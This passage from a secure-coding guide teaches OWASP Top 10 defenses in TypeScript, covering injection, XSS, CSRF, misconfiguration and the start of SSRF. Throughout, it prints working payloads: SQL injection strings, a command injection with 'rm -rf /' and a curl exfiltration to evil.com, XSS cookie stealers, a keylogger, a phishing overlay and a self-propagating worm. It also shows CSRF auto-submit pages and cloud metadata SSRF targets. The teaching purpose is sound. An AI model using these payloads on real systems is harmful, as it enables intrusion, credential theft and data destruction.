// Result: Returns ALL users

// ATTACK 2: UNION-based data extraction
// search = ' UNION SELECT username, password, null FROM users --
// Query: SELECT * FROM users WHERE name LIKE '%' UNION SELECT username, password, null FROM users --%'
// Result: Returns all usernames and password hashes

// ATTACK 3: Database enumeration
// search = ' UNION SELECT table_name, null, null FROM information_schema.tables --
// Result: Lists all tables in database

// ATTACK 4: Blind boolean-based
// search = ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a' --
// Iterate through characters to extract password

// ATTACK 5: Time-based blind
// search = ' AND IF(1=1, SLEEP(5), 0) --
// If response takes 5 seconds, condition is true

// ATTACK 6: Second-order injection
// Step 1: Register with username: admin'--
// Step 2: Change password feature uses username in query
// Query: UPDATE users SET password='newpass' WHERE username='admin'--'
// Result: Changes admin's password!

// ──────────────────────────────────────────────────────────────────────────
// DEFENSE: PARAMETERIZED QUERIES
// ──────────────────────────────────────────────────────────────────────────

// ✅ SECURE: Raw SQL with parameters (PostgreSQL)
import { Pool } from 'pg';

app.get('/api/users', async (req, res) => {
    const { search } = req.query;
    
    // Parameters are NEVER interpreted as SQL
    const result = await pool.query(
        'SELECT id, name, email FROM users WHERE name ILIKE $1',
        [`%${search}%`]
    );
    
    res.json(result.rows);
});

// ✅ SECURE: ORM (Prisma)
app.get('/api/users', async (req, res) => {
    const { search } = req.query;
    
const users = await prisma.user.findMany({
    where: {
            name: {
                contains: String(search),
                mode: 'insensitive'
            }
        },
        select: {
            id: true,
            name: true,
            email: true
            // Never select password!
        }
    });
    
    res.json(users);
});

// ✅ SECURE: Query builder (Knex)
app.get('/api/users', async (req, res) => {
    const { search } = req.query;
    
    const users = await knex('users')
        .select('id', 'name', 'email')
        .whereILike('name', `%${search}%`);
    
    res.json(users);
});

// ──────────────────────────────────────────────────────────────────────────
// EDGE CASE: Dynamic Column/Table Names
// ──────────────────────────────────────────────────────────────────────────

// ❌ VULNERABLE: Can't parameterize identifiers
app.get('/api/data', async (req, res) => {
    const { sortBy } = req.query;
    const query = `SELECT * FROM users ORDER BY ${sortBy}`;  // SQLi!
});

// ✅ SECURE: Allowlist validation
const ALLOWED_SORT_COLUMNS = ['name', 'email', 'created_at'] as const;

app.get('/api/data', async (req, res) => {
    const { sortBy } = req.query;
    
    // Validate against allowlist
    if (!ALLOWED_SORT_COLUMNS.includes(sortBy as any)) {
        return res.status(400).json({ error: 'Invalid sort column' });
    }
    
    const query = `SELECT * FROM users ORDER BY ${sortBy}`;  // Now safe
    // Or use parameterized identifier escaping:
    // const query = `SELECT * FROM users ORDER BY ${db.escapeIdentifier(sortBy)}`;
});
```

### NoSQL Injection

```typescript
// ════════════════════════════════════════════════════════════════════════════
// NoSQL INJECTION (MongoDB)
// ════════════════════════════════════════════════════════════════════════════

// ❌ VULNERABLE: Object injection
app.post('/api/login', async (req, res) => {
    const user = await User.findOne({
        username: req.body.username,
        password: req.body.password
    });
    // ...
});

// ATTACK: 
// { "username": { "$ne": "" }, "password": { "$ne": "" } }
// Query becomes: find where username is NOT empty AND password is NOT empty
// Result: Returns first user in database!

// ATTACK 2: Regex injection
// { "username": { "$regex": ".*" }, "password": { "$regex": ".*" } }

// ✅ SECURE: Type validation + explicit string conversion
import { z } from 'zod';

const loginSchema = z.object({
    username: z.string().min(1).max(100),
    password: z.string().min(1).max(100)
});

app.post('/api/login', async (req, res) => {
    // Schema validation ensures strings
    const { username, password } = loginSchema.parse(req.body);
    
    // Find user first (without password check)
    const user = await User.findOne({ 
        username: String(username)  // Extra safety
    });
    
    if (!user) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    // Verify password separately
    const validPassword = await verifyPassword(password, user.passwordHash);
    if (!validPassword) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    // Success
});
```

### Command Injection

```typescript
// ════════════════════════════════════════════════════════════════════════════
// COMMAND INJECTION
// ════════════════════════════════════════════════════════════════════════════

// ❌ VULNERABLE: Shell command with user input
import { exec } from 'child_process';

app.post('/api/convert', (req, res) => {
    const { filename } = req.body;
    exec(`convert ${filename} output.pdf`, (error, stdout) => {
        // ...
    });
});

// ATTACK:
// filename = "image.png; rm -rf /"
// Command: convert image.png; rm -rf / output.pdf
// Result: Deletes entire filesystem!

// ATTACK 2: Data exfiltration
// filename = "image.png; curl evil.com/steal?data=$(cat /etc/passwd)"

// ✅ SECURE: execFile with argument array (no shell)
import { execFile } from 'child_process';

app.post('/api/convert', (req, res) => {
    const { filename } = req.body;
    
    // Validate filename
    if (!/^[a-zA-Z0-9_-]+\.(png|jpg|gif|pdf)$/.test(filename)) {
        return res.status(400).json({ error: 'Invalid filename' });
    }
    
    // Ensure file exists in allowed directory
    const safePath = path.join('/uploads', path.basename(filename));
    if (!fs.existsSync(safePath)) {
        return res.status(404).json({ error: 'File not found' });
    }
    
    // execFile doesn't invoke shell - arguments are passed directly
    execFile('convert', [safePath, 'output.pdf'], (error, stdout) => {
        if (error) {
            return res.status(500).json({ error: 'Conversion failed' });
        }
        res.json({ success: true });
    });
});

// ✅ EVEN BETTER: Use libraries instead of shell commands
import sharp from 'sharp';

app.post('/api/convert', async (req, res) => {
    const { filename } = req.body;
    
    // Use sharp library - no shell involved
    await sharp(safePath)
        .toFormat('pdf')
        .toFile('output.pdf');
    
    res.json({ success: true });
});
```

---

*Part 2 Complete. Continue to Part 3 for XSS, CSRF, and advanced security patterns.*

# OWASP Top 10 - Part 3: XSS, CSRF, and Security Misconfiguration

## Cross-Site Scripting (XSS) Deep Dive

### XSS Types and Attack Vectors

```typescript
// ════════════════════════════════════════════════════════════════════════════
// XSS - CROSS-SITE SCRIPTING COMPLETE GUIDE
// ════════════════════════════════════════════════════════════════════════════

/*
XSS ATTACK TYPES:
┌────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│  TYPE 1: STORED XSS (Persistent) - MOST DANGEROUS                         │
│  ─────────────────────────────────────────────────                         │
│  • Malicious script saved to database                                     │
│  • Executed when ANY user views the content                               │
│  • Examples: Comments, profiles, messages, product reviews                │
│  • Impact: Mass account hijacking, worm propagation                       │
│                                                                             │
│  Flow: Attacker → Database → All Victims                                  │
│                                                                             │
│  TYPE 2: REFLECTED XSS (Non-Persistent)                                    │
│  ───────────────────────────────────────                                   │
│  • Script in URL parameter reflected back in response                     │
│  • Requires victim to click malicious link                                │
│  • Examples: Search results, error pages                                  │
│  • Impact: Targeted attacks via phishing                                  │
│                                                                             │
│  Flow: Attacker → Malicious Link → Single Victim                          │
│                                                                             │
│  TYPE 3: DOM-BASED XSS                                                     │
│  ─────────────────────                                                     │
│  • Script manipulates DOM without server involvement                      │
│  • Payload often in URL fragment (#)                                      │
│  • Examples: Client-side routing, innerHTML assignments                   │
│  • Impact: Bypasses some server-side protections                         │
│                                                                             │
│  Flow: Attacker → URL → Client JavaScript → DOM Manipulation             │
│                                                                             │
└────────────────────────────────────────────────────────────────────────────┘
*/
```

### Stored XSS Attack Scenarios

```typescript
// ──────────────────────────────────────────────────────────────────────────
// STORED XSS - REAL-WORLD ATTACK SCENARIOS
// ──────────────────────────────────────────────────────────────────────────

// SCENARIO 1: Comment with session theft
const maliciousComment = `
    Great article!
    <script>
        // Steal session cookie and send to attacker's server
        new Image().src = 'https://evil.com/steal?cookie=' + document.cookie;
    </script>
`;

// SCENARIO 2: Keylogger injection
const keyloggerPayload = `
    Nice post!
    <script>
        document.addEventListener('keydown', function(e) {
            fetch('https://evil.com/log', {
                method: 'POST',
                body: JSON.stringify({
                    key: e.key,
                    input: e.target.value,
                    page: location.href
                })
            });
        });
    </script>
`;

// SCENARIO 3: Phishing form injection
const phishingPayload = `
    <div id="fake-login" style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;">
        <h2>Session Expired - Please Login Again</h2>
        <form action="https://evil.com/phish" method="POST">
            <input name="email" placeholder="Email">
            <input name="password" type="password" placeholder="Password">
            <button type="submit">Login</button>
        </form>
    </div>
`;

// SCENARIO 4: Cryptocurrency miner
const minerPayload = `
    <script src="https://evil.com/miner.js"></script>
`;

// SCENARIO 5: Self-propagating worm (like Samy worm)
const wormPayload = `
    <script>
        // Copy this payload to victim's profile
        fetch('/api/profile', {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                bio: document.querySelector('.comment').innerHTML
            })
        });
        // Also follow attacker
        fetch('/api/follow/attacker-id', { method: 'POST' });
    </script>
`;

// ❌ VULNERABLE: Rendering user content without escaping
app.get('/api/comments/:id', async (req, res) => {
    const comment = await db.comments.findById(req.params.id);
    res.send(`<div class="comment">${comment.text}</div>`);  // XSS!
});

// ❌ VULNERABLE: React dangerouslySetInnerHTML
function Comment({ comment }) {
    return <div dangerouslySetInnerHTML={{ __html: comment.text }} />;  // XSS!
}

// ✅ SECURE: React's default escaping
function Comment({ comment }) {
    return <div>{comment.text}</div>;  // Safe - React escapes automatically
}
```

### XSS Prevention Strategies

```typescript
// ──────────────────────────────────────────────────────────────────────────
// XSS PREVENTION - DEFENSE IN DEPTH
// ──────────────────────────────────────────────────────────────────────────

// DEFENSE 1: Context-Aware Output Encoding

// HTML Context: <div>USER_INPUT</div>
function escapeHTML(str: string): string {
    const escapeMap: Record<string, string> = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#x27;',
        '/': '&#x2F;',
        '`': '&#x60;',
        '=': '&#x3D;'
    };
    return str.replace(/[&<>"'`=/]/g, char => escapeMap[char]);
}

// JavaScript Context: <script>var x = 'USER_INPUT';</script>
function escapeJS(str: string): string {
    return JSON.stringify(str);  // Handles all special chars
}

// URL Context: <a href="/search?q=USER_INPUT">
function escapeURL(str: string): string {
    return encodeURIComponent(str);
}

// CSS Context: <div style="color: USER_INPUT;">
function escapeCSS(str: string): string {
    return str.replace(/[^a-zA-Z0-9]/g, char => 
        '\\' + char.charCodeAt(0).toString(16) + ' '
    );
}

// HTML Attribute Context: <div data-value="USER_INPUT">
function escapeHTMLAttribute(str: string): string {
    return str
        .replace(/&/g, '&amp;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
}

// ──────────────────────────────────────────────────────────────────────────
// DEFENSE 2: HTML Sanitization for Rich Text
// ──────────────────────────────────────────────────────────────────────────

import DOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

const window = new JSDOM('').window;
const purify = DOMPurify(window);

// Configure allowed tags and attributes
function sanitizeHTML(dirty: string): string {
    return purify.sanitize(dirty, {
        ALLOWED_TAGS: [
            'p', 'br', 'b', 'i', 'em', 'strong', 'u', 's',
            'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
            'ul', 'ol', 'li',
            'a', 'img',
            'blockquote', 'code', 'pre',
            'table', 'thead', 'tbody', 'tr', 'th', 'td'
        ],
        ALLOWED_ATTR: [
            'href', 'src', 'alt', 'title', 'class',
            'target', 'rel'
        ],
        ALLOW_DATA_ATTR: false,
        ADD_ATTR: ['target'],  // Add target="_blank" to links
        FORBID_TAGS: ['script', 'style', 'iframe', 'form', 'input'],
        FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover'],
        // Force safe link protocols
        ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):|[^a-z]|[a-z+.-]+(?:[^a-z+.-:]|$))/i
    });
}

// Hook to modify links (add noopener)
purify.addHook('afterSanitizeAttributes', (node) => {
    if (node.tagName === 'A') {
        node.setAttribute('rel', 'noopener noreferrer');
        node.setAttribute('target', '_blank');
    }
    if (node.tagName === 'IMG') {
        // Lazy load images
        node.setAttribute('loading', 'lazy');
    }
});

// API endpoint with sanitization
app.post('/api/posts', authenticate, async (req, res) => {
    const { title, content } = req.body;
    
    // Sanitize HTML content
    const sanitizedContent = sanitizeHTML(content);
    
    // Also validate that content isn't empty after sanitization
    if (sanitizedContent.trim().length < 10) {
        return res.status(400).json({ error: 'Content too short' });
    }
    
    await db.posts.create({
        data: {
            title: escapeHTML(title),  // Plain text - escape
            content: sanitizedContent,  // Rich text - sanitize
            authorId: req.user.id
        }
    });
});

// ──────────────────────────────────────────────────────────────────────────
// DEFENSE 3: Content Security Policy (CSP)
// ──────────────────────────────────────────────────────────────────────────

import helmet from 'helmet';
import crypto from 'crypto';

// Generate nonce per request for inline scripts
app.use((req, res, next) => {
    res.locals.nonce = crypto.randomBytes(16).toString('base64');
    next();
});

// Strict CSP configuration
app.use(helmet.contentSecurityPolicy({
    directives: {
        // Default: only from same origin
        defaultSrc: ["'self'"],
        
        // Scripts: self + specific CDNs + nonce for inline
        scriptSrc: [
            "'self'",
            "https://cdn.example.com",
            (req, res) => `'nonce-${res.locals.nonce}'`,
            // "'unsafe-inline'" - AVOID if possible
            // "'unsafe-eval'" - NEVER in production
        ],
        
        // Styles: self + inline (usually safe)
        styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
        
        // Images: self + HTTPS + data URIs
        imgSrc: ["'self'", "https:", "data:"],
        
        // Fonts: self + Google Fonts
        fontSrc: ["'self'", "https://fonts.gstatic.com"],
        
        // AJAX/Fetch: self + API
        connectSrc: ["'self'", "https://api.example.com", "wss://ws.example.com"],
        
        // Frames: none (clickjacking protection)
        frameAncestors: ["'none'"],
        
        // Forms: only submit to self
        formAction: ["'self'"],
        
        // Base URI: prevent base tag hijacking
        baseUri: ["'self'"],
        
        // Object/embed: none (no Flash/plugins)
        objectSrc: ["'none'"],
        
        // Upgrade HTTP to HTTPS
        upgradeInsecureRequests: [],
        
        // Report violations
        reportUri: ['/api/csp-report']
    }
}));

// CSP violation reporting endpoint
app.post('/api/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
    const report = req.body['csp-report'];
    
    logger.warn('CSP Violation', {
        blockedUri: report['blocked-uri'],
        violatedDirective: report['violated-directive'],
        documentUri: report['document-uri'],
        originalPolicy: report['original-policy']
    });
    
    res.status(204).end();
});

// In HTML templates, use the nonce:
// <script nonce="{{nonce}}">
//     // Inline script allowed because of nonce
// </script>

// ──────────────────────────────────────────────────────────────────────────
// DEFENSE 4: HttpOnly Cookies (Session Protection)
// ──────────────────────────────────────────────────────────────────────────

app.use(session({
    name: 'sessionId',
    secret: process.env.SESSION_SECRET,
    cookie: {
        httpOnly: true,     // Cannot be accessed by JavaScript
        secure: true,       // HTTPS only
        sameSite: 'strict', // CSRF protection
        maxAge: 3600000     // 1 hour
    }
}));
```

---

## Cross-Site Request Forgery (CSRF)

### CSRF Attack Mechanics

```typescript
// ════════════════════════════════════════════════════════════════════════════
// CSRF - CROSS-SITE REQUEST FORGERY
// ════════════════════════════════════════════════════════════════════════════

/*
CSRF ATTACK FLOW:
┌────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│  1. User logs into bank.com                                                │
│     └─→ Browser stores session cookie for bank.com                        │
│                                                                             │
│  2. User visits evil.com (attacker's site)                                 │
│     └─→ While still logged into bank.com                                  │
│                                                                             │
│  3. evil.com contains hidden form or image:                                │
│     <form action="https://bank.com/transfer" method="POST">                │
│       <input name="to" value="attacker" />                                 │
│       <input name="amount" value="10000" />                                │
│     </form>                                                                 │
│     <script>document.forms[0].submit();</script>                           │
│                                                                             │
│  4. Browser automatically includes bank.com cookies                        │
│     └─→ Bank sees valid session, processes transfer!                      │
│                                                                             │
│  5. Money transferred to attacker                                          │
│                                                                             │
│  KEY INSIGHT: The browser automatically sends cookies for the domain,     │
│  regardless of which site initiated the request.                          │
│                                                                             │
└────────────────────────────────────────────────────────────────────────────┘
*/

// CSRF attack examples:

// 1. GET-based CSRF (very simple)
// <img src="https://bank.com/transfer?to=attacker&amount=10000" />

// 2. POST-based CSRF (auto-submit form)
const maliciousPage = `
<html>
<body onload="document.forms[0].submit()">
    <form action="https://bank.com/transfer" method="POST">
        <input type="hidden" name="to" value="attacker" />
        <input type="hidden" name="amount" value="10000" />
    </form>
</body>
</html>
`;

// 3. AJAX-based CSRF (if CORS misconfigured)
const maliciousScript = `
fetch('https://api.bank.com/transfer', {
    method: 'POST',
    credentials: 'include',  // Include cookies
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ to: 'attacker', amount: 10000 })
});
`;
```

### CSRF Prevention

```typescript
// ──────────────────────────────────────────────────────────────────────────
// CSRF PREVENTION STRATEGIES
// ──────────────────────────────────────────────────────────────────────────

// DEFENSE 1: SameSite Cookies (Modern - Best)
app.use(session({
    cookie: {
        httpOnly: true,
        secure: true,
        sameSite: 'strict'  // Cookie NOT sent with cross-site requests
    }
}));

/*
SAMESITE OPTIONS:
┌─────────────┬────────────────────────────────────────────────────────────┐
│ Value       │ Behavior                                                    │
├─────────────┼────────────────────────────────────────────────────────────┤
│ Strict      │ Never sent cross-site. Breaks: links from email, OAuth    │
│ Lax         │ Sent with top-level GET navigation. Good default.         │
│ None        │ Always sent. Requires Secure flag. Only for cross-site.   │
└─────────────┴────────────────────────────────────────────────────────────┘

Recommendation:
- Use 'Strict' for session cookies
- Use 'Lax' if you need links from external sites to work
- Use 'None' only for intentional cross-site scenarios (embedded widgets)
*/

// DEFENSE 2: CSRF Tokens (Traditional - Still Valid)
import csrf from 'csurf';

const csrfProtection = csrf({ 
    cookie: {
        httpOnly: true,
        secure: true,
        sameSite: 'strict'
    }
});

// Get token for SPA
app.get('/api/csrf-token', csrfProtection, (req, res) => {
    res.json({ csrfToken: req.csrfToken() });
});

// Protected endpoints automatically validate token
app.post('/api/transfer', csrfProtection, async (req, res) => {
    // Token validated by middleware
    await processTransfer(req.body);
    res.json({ success: true });
});

// Frontend must include token:
// fetch('/api/transfer', {
//     method: 'POST',
//     headers: {
//         'Content-Type': 'application/json',
//         'X-CSRF-Token': csrfToken
//     },
//     body: JSON.stringify(data)
// });

// DEFENSE 3: Double Submit Cookie Pattern
function doubleSubmitCookie() {
    return (req: Request, res: Response, next: NextFunction) => {
        if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {
            return next();
        }
        
        const cookieToken = req.cookies['csrf-token'];
        const headerToken = req.headers['x-csrf-token'];
        
        if (!cookieToken || !headerToken || cookieToken !== headerToken) {
            return res.status(403).json({ error: 'CSRF validation failed' });
        }
        
        next();
    };
}

// Set CSRF cookie on login
app.post('/api/login', async (req, res) => {
    // ... authenticate user
    
    // Set CSRF token cookie (readable by JS, unlike session cookie)
    const csrfToken = crypto.randomBytes(32).toString('hex');
    res.cookie('csrf-token', csrfToken, {
        httpOnly: false,  // JS needs to read this
        secure: true,
        sameSite: 'strict'
    });
    
    res.json({ user });
});

// DEFENSE 4: Origin/Referer Validation
const ALLOWED_ORIGINS = new Set([
    'https://myapp.com',
    'https://www.myapp.com',
    'https://app.myapp.com'
]);

function validateOrigin(req: Request, res: Response, next: NextFunction) {
    // Skip safe methods
    if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {
        return next();
    }
    
    // Check Origin header (most reliable)
    const origin = req.get('Origin');
    if (origin && ALLOWED_ORIGINS.has(origin)) {
        return next();
    }
    
    // Fall back to Referer (may be stripped by privacy settings)
    const referer = req.get('Referer');
    if (referer) {
        try {
            const refererOrigin = new URL(referer).origin;
            if (ALLOWED_ORIGINS.has(refererOrigin)) {
            return next();
            }
        } catch {
            // Invalid URL
        }
    }
    
    // Strict mode: reject if neither header present
    logger.warn('CSRF: Missing/invalid origin', {
        origin,
        referer,
        path: req.path,
        ip: req.ip
    });
    
    return res.status(403).json({ error: 'Origin validation failed' });
}
```

---

## A05: Security Misconfiguration

### Common Misconfigurations

```typescript
// ════════════════════════════════════════════════════════════════════════════
// SECURITY MISCONFIGURATION - THE MOST COMMON ISSUE
// ════════════════════════════════════════════════════════════════════════════

/*
MISCONFIGURATION CATEGORIES:
┌────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│  1. DEFAULT CREDENTIALS                                                    │
│     • admin:admin, root:root, postgres:postgres                           │
│     • Default API keys, unchanged secrets                                 │
│                                                                             │
│  2. VERBOSE ERROR MESSAGES                                                 │
│     • Stack traces in production                                          │
│     • SQL errors exposing schema                                          │
│     • Internal paths revealed                                             │
│                                                                             │
│  3. UNNECESSARY FEATURES ENABLED                                           │
│     • Directory listing                                                   │
│     • Debug endpoints                                                     │
│     • Unused ports/services                                               │
│                                                                             │
│  4. MISSING SECURITY HEADERS                                               │
│     • No CSP, HSTS, X-Frame-Options                                       │
│     • Permissive CORS                                                     │
│                                                                             │
│  5. OUTDATED/UNPATCHED SYSTEMS                                            │
│     • Known CVEs                                                          │
│     • EOL software versions                                               │
│                                                                             │
│  6. CLOUD MISCONFIGURATIONS                                               │
│     • Public S3 buckets                                                   │
│     • Open security groups                                                │
│     • Excessive IAM permissions                                           │
│                                                                             │
└────────────────────────────────────────────────────────────────────────────┘
*/

// ──────────────────────────────────────────────────────────────────────────
// MISCONFIGURATION 1: Verbose Error Messages
// ──────────────────────────────────────────────────────────────────────────

// ❌ VULNERABLE: Exposing stack traces
app.use((err: Error, req: Request, res: Response, next: NextFunction) => {
    res.status(500).json({
        error: err.message,
        stack: err.stack,           // Exposes file paths!
        query: (err as any).query,  // Exposes SQL queries!
        env: process.env            // Exposes ALL secrets!
    });
});

// ATTACK: Trigger an error, learn about:
// - Framework versions from stack trace
// - Database schema from SQL errors
// - Internal file paths
// - Environment variables

// ✅ SECURE: Environment-aware error handling
class AppError extends Error {
    constructor(
        public statusCode: number,
        public message: string,
        public isOperational: boolean = true,
        public code?: string
    ) {
        super(message);
        Error.captureStackTrace(this, this.constructor);
    }
}

// Custom error types
class ValidationError extends AppError {
    constructor(message: string, public details?: any) {
        super(400, message, true, 'VALIDATION_ERROR');
    }
}

class NotFoundError extends AppError {
    constructor(resource: string) {
        super(404, `${resource} not found`, true, 'NOT_FOUND');
    }
}

class UnauthorizedError extends AppError {
    constructor(message: string = 'Authentication required') {
        super(401, message, true, 'UNAUTHORIZED');
    }
}

// Error handler middleware
app.use((err: Error, req: Request, res: Response, next: NextFunction) => {
    // Generate error ID for tracking
    const errorId = crypto.randomUUID();
    
    // Log full error server-side
    logger.error('Request error', {
        errorId,
        error: err.message,
        stack: err.stack,
        path: req.path,
        method: req.method,
        userId: req.user?.id,
        body: redactSensitive(req.body),
        query: redactSensitive(req.query)
    });
    
    // Send safe response to client
    if (err instanceof AppError && err.isOperational) {
        return res.status(err.statusCode).json({
            error: err.message,
            code: err.code,
            ...(err instanceof ValidationError && { details: err.details })
        });
    }
    
    // Unexpected error - don't leak details
    res.status(500).json({ 
        error: process.env.NODE_ENV === 'production' 
            ? 'An unexpected error occurred'
            : err.message,
        errorId  // For support ticket reference
    });
});

// Redact sensitive fields from logs
const SENSITIVE_KEYS = ['password', 'token', 'secret', 'authorization', 'cookie', 'ssn', 'creditCard'];

function redactSensitive(obj: any, depth = 0): any {
    if (depth > 10 || !obj || typeof obj !== 'object') return obj;
    
    const redacted: any = Array.isArray(obj) ? [] : {};
    
    for (const [key, value] of Object.entries(obj)) {
        if (SENSITIVE_KEYS.some(k => key.toLowerCase().includes(k))) {
            redacted[key] = '[REDACTED]';
        } else if (typeof value === 'object') {
            redacted[key] = redactSensitive(value, depth + 1);
        } else {
            redacted[key] = value;
        }
    }
    
    return redacted;
}

// ──────────────────────────────────────────────────────────────────────────
// MISCONFIGURATION 2: Debug Endpoints in Production
// ──────────────────────────────────────────────────────────────────────────

// ❌ VULNERABLE: Debug routes accessible in production
app.get('/debug/env', (req, res) => {
    res.json(process.env);  // Exposes ALL secrets!
});

app.get('/debug/users', async (req, res) => {
    res.json(await db.users.findMany());  // Dumps user data!
});

app.get('/debug/queries', (req, res) => {
    res.json(queryLog);  // Exposes all SQL queries!
});

// ✅ SECURE: Environment-gated debug routes
if (process.env.NODE_ENV !== 'production') {
    const debugRouter = express.Router();
    
    // Require special debug key
    debugRouter.use((req, res, next) => {
        const debugKey = req.headers['x-debug-key'];
        if (debugKey !== process.env.DEBUG_KEY) {
            return res.status(403).json({ error: 'Invalid debug key' });
        }
        next();
    });
    
    debugRouter.get('/env', (req, res) => {
        const safeEnv = { ...process.env };
        delete safeEnv.DATABASE_URL;
        delete safeEnv.JWT_SECRET;
        // ... delete other secrets
        res.json(safeEnv);
    });
    
    app.use('/debug', debugRouter);
}

// ──────────────────────────────────────────────────────────────────────────
// MISCONFIGURATION 3: Missing Security Headers
// ──────────────────────────────────────────────────────────────────────────

// ✅ SECURE: Complete security headers with Helmet
import helmet from 'helmet';

app.use(helmet({
    // Content Security Policy (XSS prevention)
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'"],
            imgSrc: ["'self'", "data:", "https:"],
            connectSrc: ["'self'"],
            fontSrc: ["'self'"],
            objectSrc: ["'none'"],
            frameAncestors: ["'none'"],
            upgradeInsecureRequests: []
        }
    },
    
    // HTTP Strict Transport Security
    hsts: {
        maxAge: 63072000,  // 2 years
        includeSubDomains: true,
        preload: true
    },
    
    // Prevent MIME type sniffing
    noSniff: true,
    
    // XSS filter (legacy browsers)
    xssFilter: true,
    
    // Prevent clickjacking
    frameguard: { action: 'deny' },
    
    // Hide X-Powered-By header
    hidePoweredBy: true,
    
    // Referrer policy
    referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
    
    // Permissions policy (feature policy)
    permittedCrossDomainPolicies: { permittedPolicies: 'none' }
}));

// Additional custom headers
app.use((req, res, next) => {
    // Prevent caching of sensitive pages
    if (req.path.startsWith('/api/')) {
        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
        res.setHeader('Pragma', 'no-cache');
    }
    
    // Permissions Policy (formerly Feature-Policy)
    res.setHeader('Permissions-Policy', 
        'camera=(), microphone=(), geolocation=(), payment=()'
    );
    
    next();
});

// ──────────────────────────────────────────────────────────────────────────
// MISCONFIGURATION 4: CORS Misconfiguration
// ──────────────────────────────────────────────────────────────────────────

// ❌ VULNERABLE: Allowing all origins
app.use(cors({
    origin: '*',  // DANGEROUS!
    credentials: true
}));

// ❌ VULNERABLE: Reflecting Origin header
app.use(cors({
    origin: (origin, callback) => {
        callback(null, origin);  // Reflects any origin!
    },
    credentials: true
}));

// ✅ SECURE: Strict origin allowlist
const ALLOWED_ORIGINS = [
    'https://myapp.com',
    'https://www.myapp.com',
    'https://admin.myapp.com'
];

// Development origins
if (process.env.NODE_ENV !== 'production') {
    ALLOWED_ORIGINS.push('http://localhost:3000', 'http://localhost:3001');
}

app.use(cors({
    origin: (origin, callback) => {
        // Allow requests with no origin (mobile apps, Postman)
        if (!origin) {
            return callback(null, true);
        }
        
        if (ALLOWED_ORIGINS.includes(origin)) {
            return callback(null, origin);
        }
        
        callback(new Error('CORS policy violation'));
    },
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token'],
    exposedHeaders: ['X-Total-Count'],
    maxAge: 86400  // Cache preflight for 24 hours
}));

// ──────────────────────────────────────────────────────────────────────────
// SECURE CONFIGURATION CHECKLIST
// ──────────────────────────────────────────────────────────────────────────

// Startup validation
function validateConfiguration() {
    const errors: string[] = [];
    
    // Required environment variables
    const required = [
        'DATABASE_URL',
        'JWT_SECRET',
        'SESSION_SECRET',
        'ENCRYPTION_KEY'
    ];
    
    for (const envVar of required) {
        if (!process.env[envVar]) {
            errors.push(`Missing required env var: ${envVar}`);
        }
    }
    
    // Security checks
    if (process.env.NODE_ENV === 'production') {
        if (process.env.JWT_SECRET?.length < 32) {
            errors.push('JWT_SECRET too short (min 32 chars)');
        }
        
        if (process.env.DEBUG === 'true') {
            errors.push('DEBUG should not be enabled in production');
        }
        
        if (!process.env.DATABASE_URL?.includes('ssl=true')) {
            errors.push('Database connection should use SSL');
        }
    }
    
    if (errors.length > 0) {
        console.error('Configuration errors:');
        errors.forEach(e => console.error(`  - ${e}`));
        process.exit(1);
    }
}

validateConfiguration();
```

---

*Part 3 Complete. Continue to Part 4 for SSRF, Security Logging, Real-World Scenarios.*

# OWASP Top 10 - Part 4: SSRF, Logging, Components & Real-World Scenarios

## A10: Server-Side Request Forgery (SSRF)

### Understanding SSRF Attacks

```typescript
// ════════════════════════════════════════════════════════════════════════════
// SSRF - SERVER-SIDE REQUEST FORGERY
// ════════════════════════════════════════════════════════════════════════════

/*
SSRF ATTACK EXPLAINED:
┌────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│  Normal: User provides URL → Server fetches → Returns content             │
│  Attack: User provides INTERNAL URL → Server fetches internal resource    │
│                                                                             │
│  WHY IT'S CRITICAL IN CLOUD:                                               │
│  ┌────────────────────────────────────────────────────────────────────┐   │
│  │                                                                     │   │
│  │  AWS/GCP/Azure metadata endpoints:                                 │   │
│  │  http://169.254.169.254/latest/meta-data/                         │   │
│  │  http://169.254.169.254/latest/meta-data/iam/security-credentials/│   │
│  │                                                                     │   │
│  │  This endpoint returns:                                            │   │
│  │  • AWS Access Key                                                  │   │
│  │  • AWS Secret Key                                                  │   │
│  │  • Session Token                                                   │   │
│  │                                                                     │   │
│  │  Result: FULL CLOUD ACCOUNT COMPROMISE                             │   │
│  │                                                                     │   │
│  └────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│  Other SSRF targets:                                                       │
│  • http://localhost:6379 (Redis - can execute commands)                   │
│  • http://localhost:9200 (Elasticsearch - data dump)                      │
│  • http://internal-api.local (Internal microservices)                     │
│  • file:///etc/passwd (Local files on Linux)                             │
│  • gopher:// (Legacy protocol, can craft arbitrary requests)              │
│                                                                             │
└────────────────────────────────────────────────────────────────────────────┘
*/

// REAL ATTACK EXAMPLE: Capital One Breach (2019)
// 1. Attacker found SSRF vulnerability in WAF
// 2. Used it to access AWS metadata endpoint
// 3. Retrieved IAM credentials
